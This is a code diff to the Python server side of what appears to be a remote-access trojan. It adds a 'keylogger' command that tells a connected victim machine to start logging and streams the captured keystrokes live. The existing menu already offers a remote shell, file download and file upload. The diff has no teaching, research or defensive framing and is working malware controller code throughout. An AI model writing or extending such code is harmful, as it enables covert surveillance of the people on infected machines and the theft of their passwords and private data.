@@ -64,9 +64,8 @@ def handleClient(client_sock,addr):
             print("Process timed out. \n" + str(e))
             print(f"{addr[0]}>",end='')
         except BrokenPipeError as e:
-            print(e)
-            print(f"{addr[0]}>",end='')
-            continue
+            print("Connection closed. Broken pipe.")
+            break
         except Exception as e:
             print("Error sending command! \n" + str(e))
             print(f"{addr[0]}>",end='')
@@ -158,19 +157,43 @@ def client_console(cmd):
                 download_file(newCMD,CURRENT_CONNECTIONS[target])
             elif "up" in newCMD: #Upload file
                 upload_file(newCMD,CURRENT_CONNECTIONS[target])
+            elif "keylogger" in newCMD:
+                start_keylog(newCMD, CURRENT_CONNECTIONS[target])
             elif "help" in newCMD: #Help menu
                 print("\nHelp Menu:\
                     \n\tUse 'exit' to return to main menu. \
                     \n\tUse 'help' to show this menu. \
                     \n\tUse 'shell' to gain a shell on the client's machine \
                     \n\tUse 'dl' to download a file.\
-                    \n\tUse 'ul' to upload a file.")
+                    \n\tUse 'ul' to upload a file.\
+                    \n\tUse 'keylogger' to start a live keylog of the clients machine.")
             elif "exit" in newCMD:
                 break
             else:
                 print("Command unknwon. Use 'help' to list commands.")
     except Exception as e:
         print("Invalid use of command! \n" + str(e))
+
+def start_keylog(cmd,conn):
+    print("Keylogger starting... Use ctrl+c to end logging.")
+    conn.send("START_KEYL0GGER".encode())
+    try:
+        log = ''
+        print()
+        while True:
+            out = conn.recv(BUFFER_SIZE).decode()
+            sys.stdout.flush()
+            if out == "BACKSPACE":
+                log = log[:-1]
+            elif out == "ENTER":
+                log += "\n"
+            else:
+                log += out
+            print(f"{log}",end="\r")
+
+    except KeyboardInterrupt:
+        conn.send("KEY_L0GGER-END".encode())
+        print("Keylogger ending...\nReturning to main menu.")
 
 def download_file(cmd,conn):
     try:
